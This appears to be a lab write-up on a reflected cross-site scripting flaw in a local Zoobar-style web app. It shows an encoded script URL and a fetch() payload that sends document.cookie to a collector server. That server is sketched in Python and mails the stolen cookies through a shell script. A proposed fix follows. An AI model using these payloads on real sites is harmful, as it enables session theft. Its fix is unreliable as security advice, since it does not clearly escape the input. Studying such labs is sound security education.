# 3. Browser Protection
## 3.1. Remote Execution - Reflected Cross-site Scripting 

The goal is to create a URL that, when accessed, will cause the victim's browser to execute some JavaScript you as the attacker has supplied.
* When examining a URLs, there is one where the parameter is sent along with the URL, and then reflected back to the user view. 
* The url is http://localhost:8080/zoobar/index.cgi/users?user=user_name
* The user_name parameter is reflected back to the search box in the users page and its actually part of the value attribute of the input tag
* By replacing the user_name with a javascript code, we can execute the javascript code in the victim's browser
* The javascript code that will be executed is alert(document.cookie); which will pop up an alert box with the victim's cookies
* in order to execute the javascript code, we need to escape the double quotes and the angle brackets.
* The final url will be http://localhost:8080/zoobar/index.cgi/users?user=%22%3Cp%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C/p%3E%22
* this will translate to ``` "<p><script>alert(document.cookie);</script></p>" ``` which will be reflected and print the victim's cookies in an alert box

### Following are screenshots of the attack:

#### finding the reflected parameter:

<img alt="image" src="https://user-images.githubusercontent.com/13490629/220351090-0779ae1b-2759-4572-a71c-edab7bb23eda.png" width="500"/>

#### finding the dom element that affected by the reflected parameter:

<img alt="image" height="500" src="https://user-images.githubusercontent.com/13490629/220351201-c61efa0b-17c8-4b2d-b61e-2cf8f8ff17aa.png"/>

#### testing the attack:

![image](https://user-images.githubusercontent.com/13490629/220351284-d2ba3c53-f03c-4e76-b878-cf627d515ef0.png)


## 3.2. Steal Cookies
* creating different url from previous attack, this making sure that the victim won't notice the attack
```html
 <!-- original source -->
<input type="text" name="user" value="{{ req_user }}" size=10></span><br>
<!-- the final payload -->
"size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
```
* creating **"send_mail.sh"** shell script that will send the cookies to my mail
```shell
#!/bin/bash 
.
echo "Cookie value is: $1" | mail -s "$SUBJECT" "$TO"
.
.
```

* creating python server **"evil_server.py"** that will listen to the request and get the cookies as request parameter
* the python server will execute the shell script and send the cookies to my mail
```python
.
server = HTTPServer((host, port), RequestHandler)
.
.
cookie = os.path.basename(path).replace('cookie/', '')
.
.
output = subprocess.check_output(['sh', 'send_mail.sh', cookie])
.
.
```
## 3.3. Protect, Fix the XSS Vulnerability

* To fix the vulnerability, we need to escape the user input before printing it to the page using request.form.get() function
* this way, the input will be escaped and won't reflect directly to the page
* the line that need to be changed is in the **"users.html"** file
```html
- <!--<input type="text" name="user" value="{{ req_user }}" size=10></span><br>-->
+ <input type="text" name="user" value="{{ request.form.get('user', '') }}" size=10></span><br>
```


